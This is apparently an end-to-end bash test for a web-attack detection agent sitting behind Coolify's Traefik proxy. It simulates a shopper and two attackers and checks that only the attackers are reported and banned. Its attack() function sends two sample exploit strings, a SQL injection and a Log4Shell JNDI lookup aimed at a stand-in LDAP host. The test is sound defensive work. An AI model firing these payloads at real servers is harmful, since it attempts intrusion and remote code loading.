# Sourced by inside.sh: web attack detection behind Coolify's proxy. A real
# Traefik (the release binary, checksum pinned) runs on the host in front of
# a shop backend; the fake Docker API (mockapi -docker-sock) shows it as
# coolify-proxy with Coolify's command and its /data/coolify/proxy mount.
#   off:    no --accesslog: the agent logs what to add in Coolify
#   file:   JSON access log in /data/coolify/proxy/access.log
#   stdout: the default format, read from the container's output
# In both on cases a shopper's Medusa/Next.js requests raise nothing and an
# attacker's are reported (with the site) and banned, and the attacker is
# then blocked. Adds "traefik=..." to EXTRA_RESULT, EXTRA_FAIL on a failure.

R_TRAEFIK=fail
TRAEFIK_VERSION=3.7.14
TRAEFIK_SHA_amd64=d08641f5de2dd3788097bddab1ce4b29c10a0b788566970db707fa5c94c71f15
TRAEFIK_SHA_arm64=e5a2d0620cecc01dbc3d8da739db0671fdc030ef1c3b2d90d54f3baaa25d85d3
tapi=http://127.0.0.1:8080
tsock=/run/podman/podman.sock
SITE=shop.coolify-e2e.example.com
SHOPPER=198.18.40.2 ATTACKER=198.18.41.2 ATTACKER2=198.18.42.2
tlog() { log "traefik: $*"; }
tfail=""
tf() { tfail="$tfail $1"; tlog "FAIL $1${2:+: $2}"; }

# ── network: shopper and two attackers, each in its own namespace ──
for n in 0 1 2; do
  ip netns add "tr$n"
  ip link add "vtr${n}a" type veth peer name "vtr${n}b"
  ip link set "vtr${n}b" netns "tr$n"
  ip addr add "198.18.4$n.1/24" dev "vtr${n}a" && ip link set "vtr${n}a" up
  ip netns exec "tr$n" ip addr add "198.18.4$n.2/24" dev "vtr${n}b"
  ip netns exec "tr$n" ip link set "vtr${n}b" up
  ip netns exec "tr$n" ip link set lo up
done
# req NS PATH [curl args...]: a request to the shop through Traefik.
req() {
  local ns=$1 path=$2; shift 2
  ip netns exec "$ns" curl -s -o /dev/null -m 5 -w '%{http_code}' -H "Host: $SITE" -A 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' "$@" "http://198.18.4${ns#tr}.1:8088$path"
}
shop_visit() {
  local ns=$1
  req "$ns" '/store/products?fields=*variants.calculated_price,+variants.inventory_quantity&region_id=reg_01JC3X&limit=12' >/dev/null
  req "$ns" '/store/regions' >/dev/null
  req "$ns" '/store/carts' -X POST -H 'Content-Type: application/json' -d '{"region_id":"reg_01JC3X"}' >/dev/null
  req "$ns" '/store/carts/cart_01JC3Y2K7T/line-items' -X POST -H 'Content-Type: application/json' -d '{"variant_id":"variant_01","quantity":1}' >/dev/null
  req "$ns" '/store/customers/me?fields=*orders' >/dev/null
  req "$ns" '/auth/customer/emailpass' -X POST -H 'Content-Type: application/json' -d '{"email":"a@example.com","password":"x"}' >/dev/null
  req "$ns" '/app/orders?offset=0&order=-created_at' >/dev/null
  req "$ns" '/admin/products?limit=20&offset=0&order=-created_at&fields=%2Bthumbnail%2C*categories' >/dev/null
  req "$ns" '/hooks/payment/stripe_stripe' -X POST -d '{}' >/dev/null
  req "$ns" '/_next/static/chunks/app/%5BcountryCode%5D/(main)/page-3f9a2c1d.js' >/dev/null
  req "$ns" '/_next/image?url=https%3A%2F%2Fcdn.example.com%2Ftee-black-front.png&w=1080&q=75' >/dev/null
  req "$ns" '/us/products/t-shirt?_rsc=1x2y3' >/dev/null
}
attack() {
  local ns=$1
  req "$ns" '/store/products?id=1%27%20OR%201=1--' >/dev/null
  req "$ns" '/?x=%24%7Bjndi:ldap://198.51.100.1/a%7D' >/dev/null
}
# event_for IP TYPE: the event's JSON, if reported.
event_for() { curl -s "$tapi/state" | grep -o "{\"type\":\"$2\",\"severity\":\"[a-z]*\",\"source_ip\":\"$1\"[^}]*}" | tail -1; }
any_event_for() { curl -s "$tapi/state" | grep -o "\"source_ip\":\"$1\"" | head -1; }
banned() { curl -s "$tapi/state" | sed -n 's/.*"bans":\(\[[^]]*\]\).*/\1/p' | grep -qF "\"$1\""; }
# wait_journal SINCE PATTERN SECONDS
wait_journal() {
  for _ in $(seq 1 "$3"); do
    journalctl -u infrafence-agent --no-pager --since "$1" | grep -qF -- "$2" && return 0
    sleep 1
  done
  return 1
}
start_mock() {
  kill "$tmock" 2>/dev/null; wait "$tmock" 2>/dev/null
  mkdir -p /run/podman
  /distro/mockapi -docker-sock "$tsock" -traefik-log "$1" -traefik-out /tmp/traefik-out.log >>/tmp/mockdocker-traefik.log 2>&1 &
  tmock=$!
  for _ in $(seq 1 20); do [ -S "$tsock" ] && break; sleep 0.5; done
}
start_traefik() {
  kill "$ttr" 2>/dev/null; wait "$ttr" 2>/dev/null
  : >/tmp/traefik-out.log
  /tmp/traefik --entrypoints.web.address=:8088 --providers.file.filename=/tmp/traefik-dyn.yml "$@" >>/tmp/traefik-out.log 2>&1 &
  ttr=$!
  for _ in $(seq 1 30); do
    [ "$(curl -s -o /dev/null -m 2 -w '%{http_code}' -H "Host: $SITE" http://127.0.0.1:8088/)" = 200 ] && return 0
    sleep 0.5
  done
  return 1
}
restart_agent() {
  since=$(date '+%Y-%m-%d %H:%M:%S')
  sleep 1
  systemctl restart infrafence-agent
}

# ── Traefik release binary ──
case "$(uname -m)" in aarch64|arm64) tarch=arm64 ;; *) tarch=amd64 ;; esac
tsha_var=TRAEFIK_SHA_$tarch
turl=https://github.com/traefik/traefik/releases/download/v$TRAEFIK_VERSION/traefik_v${TRAEFIK_VERSION}_linux_$tarch.tar.gz
tmock="" ttr="" tshop=""
if ! curl -fsSL -m 120 --retry 3 --retry-all-errors --retry-delay 5 -o /tmp/traefik.tgz "$turl"; then
  tf download "$turl"
elif [ "$(sha256sum /tmp/traefik.tgz | cut -d' ' -f1)" != "${!tsha_var}" ]; then
  tf checksum "$(sha256sum /tmp/traefik.tgz)"
elif ! tar -xzf /tmp/traefik.tgz -C /tmp traefik; then
  tf extract
fi

if [ -z "$tfail" ]; then
  curl -s -X POST "$tapi/set-sync" -d '{"config":{"bf_threshold":5,"bf_window":60,"monitor_mode":false}}' >/dev/null
  /distro/mockapi -shop 127.0.0.1:8090 >/tmp/mockshop.log 2>&1 &
  tshop=$!
  # Coolify names its routers https-0-<app>: the default format logs the
  # router, and the agent maps it to the host through the app's labels.
  cat >/tmp/traefik-dyn.yml <<EOF
http:
  routers:
    https-0-qk8s0o4:
      rule: "Host(\`$SITE\`)"
      service: shop
      entryPoints: [web]
  services:
    shop:
      loadBalancer:
        servers:
          - url: "http://127.0.0.1:8090"
EOF
  mkdir -p /data/coolify/proxy

  # ── off: the hint, with what to add in Coolify ──
  start_mock ""
  start_traefik || tf "traefik-start" "$(tail -3 /tmp/traefik-out.log)"
  restart_agent
  if wait_journal "$since" 'coolify-proxy is a traefik proxy with its access log off' 60 &&
     wait_journal "$since" '- --accesslog.filepath=/traefik/access.log' 5 &&
     wait_journal "$since" 'Proxy > Configuration' 5; then
    tlog "off: hint logged"
  else
    tf off-hint
  fi

  # ── file: JSON in /data/coolify/proxy/access.log ──
  start_traefik --accesslog=true --accesslog.format=json --accesslog.filepath=/data/coolify/proxy/access.log \
    --accesslog.fields.headers.names.User-Agent=keep || tf "traefik-start-file"
  start_mock file
  restart_agent
  if wait_journal "$since" 'reading /data/coolify/proxy/access.log: traefik access log file of container coolify-proxy' 60; then
    sleep 2
    shop_visit tr0
    attack tr1
    ok=no
    for _ in $(seq 1 30); do banned "$ATTACKER" && ok=yes && break; sleep 1; done
    ev=$(event_for "$ATTACKER" rce_attempt)
    grep -qF "\"domain\":\"$SITE\"" <<<"$ev" || tf file-event "${ev:-none}"
    [ "$ok" = yes ] || tf file-ban
    code=$(req tr1 /store/regions)
    [ "$code" = 000 ] || tf file-blocked "$code"
    [ -z "$(any_event_for "$SHOPPER")" ] || tf file-shopper "$(event_for "$SHOPPER" '[a-z_0-9]*')"
    banned "$SHOPPER" && tf file-shopper-banned
    grep -c '"ClientHost":"198.18.4' /data/coolify/proxy/access.log | sed 's/^/[inside] traefik: file lines: /'
  else
    tf file-source "$(journalctl -u infrafence-agent --no-pager --since "$since" | grep webwatcher | tail -5)"
  fi

  # ── stdout: the default format, from the container's output ──
  start_traefik --accesslog=true || tf "traefik-start-stdout"
  start_mock stdout
  restart_agent
  if wait_journal "$since" 'reading docker://coolify-proxy: traefik access log from the output of container coolify-proxy' 60; then
    sleep 3
    shop_visit tr0
    attack tr2
    ok=no
    for _ in $(seq 1 30); do banned "$ATTACKER2" && ok=yes && break; sleep 1; done
    ev=$(event_for "$ATTACKER2" rce_attempt)
    grep -qF "\"domain\":\"$SITE\"" <<<"$ev" || tf stdout-event "${ev:-none}"
    [ "$ok" = yes ] || tf stdout-ban
    [ -z "$(any_event_for "$SHOPPER")" ] || tf stdout-shopper
    # The heartbeat reports the source and its format.
    hb=""
    for _ in $(seq 1 90); do
      hb=$(curl -s "$tapi/state" | grep -o '"web_detection":{.*' | head -c 4000)
      grep -qF '"format":"traefik-clf"' <<<"$hb" && break
      sleep 1
    done
    grep -qF '"container":"coolify-proxy","format":"traefik-clf"' <<<"$hb" || grep -qF '"format":"traefik-clf"' <<<"$hb" || tf stdout-heartbeat "${hb:0:300}"
  else
    tf stdout-source "$(journalctl -u infrafence-agent --no-pager --since "$since" | grep -E 'webwatcher|docker' | tail -5)"
  fi
  [ -z "$tfail" ] && R_TRAEFIK=ok
  [ -n "$tfail" ] && { tail -5 /tmp/traefik-out.log; tail -5 /tmp/mockdocker-traefik.log; journalctl -u infrafence-agent --no-pager | grep webwatcher | tail -15; }
fi

kill "$tmock" "$ttr" "$tshop" 2>/dev/null
wait "$tmock" "$ttr" "$tshop" 2>/dev/null
rm -f "$tsock" /tmp/traefik /tmp/traefik.tgz
rm -rf /data/coolify
for n in 0 1 2; do ip netns del "tr$n" 2>/dev/null; done
systemctl restart infrafence-agent

EXTRA_RESULT="${EXTRA_RESULT:-} traefik=$R_TRAEFIK"
[ "$R_TRAEFIK" = fail ] && EXTRA_FAIL=1
true
